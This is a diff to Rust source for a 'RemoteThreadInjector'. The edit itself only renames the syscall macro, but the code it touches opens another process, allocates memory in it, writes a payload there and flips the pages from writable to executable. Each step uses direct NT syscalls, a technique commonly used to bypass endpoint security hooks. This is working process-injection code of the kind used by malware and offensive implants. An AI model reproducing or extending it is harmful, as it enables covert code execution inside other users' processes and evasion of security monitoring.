@@ -31,7 +31,7 @@ impl Injector for RemoteThreadInjector {
         unsafe {
             let mut h_proc: usize = 0;
             let access_mask = (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD) as u64;
-            let open_status = nt_syscall::syscall!(
+            let open_status = syscall!(
                 "NtOpenProcess",
                 &mut h_proc as *mut _ as u64,
                 access_mask,
@@ -46,7 +46,7 @@ impl Injector for RemoteThreadInjector {
 
             macro_rules! close_h {
                 ($h:expr) => {
-                    nt_syscall::syscall!("NtClose", $h as u64).ok();
+                    syscall!("NtClose", $h as u64).ok();
                 };
             }
             macro_rules! cleanup_and_err {
@@ -59,7 +59,7 @@ impl Injector for RemoteThreadInjector {
             // Allocate RW first; switch to RX after writing to avoid RWX pages
             let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
             let mut alloc_size = payload.len();
-            let s = nt_syscall::syscall!(
+            let s = syscall!(
                 "NtAllocateVirtualMemory",
                 h_proc as u64, &mut remote_mem as *mut _ as u64,
                 0u64, &mut alloc_size as *mut _ as u64,
@@ -74,7 +74,7 @@ impl Injector for RemoteThreadInjector {
             }
 
             let mut written = 0usize;
-            let s = nt_syscall::syscall!(
+            let s = syscall!(
                 "NtWriteVirtualMemory",
                 h_proc as u64, remote_mem as u64,
                 payload.as_ptr() as u64, payload.len() as u64,
@@ -96,7 +96,7 @@ impl Injector for RemoteThreadInjector {
             let mut old_prot = 0u32;
             let mut prot_base = remote_mem as usize;
             let mut prot_size = payload.len();
-            let s = nt_syscall::syscall!(
+            let s = syscall!(
                 "NtProtectVirtualMemory",
                 h_proc as u64, &mut prot_base as *mut _ as u64,
                 &mut prot_size as *mut _ as u64,
@@ -109,7 +109,7 @@ impl Injector for RemoteThreadInjector {
 
             // Flush I-cache before creating the new thread.  Required for
             // correctness on ARM64 and defense-in-depth on x86_64.
-            nt_syscall::syscall!(
+            syscall!(
                 "NtFlushInstructionCache",
                 h_proc as u64, remote_mem as u64, payload.len() as u64,
             ).ok();
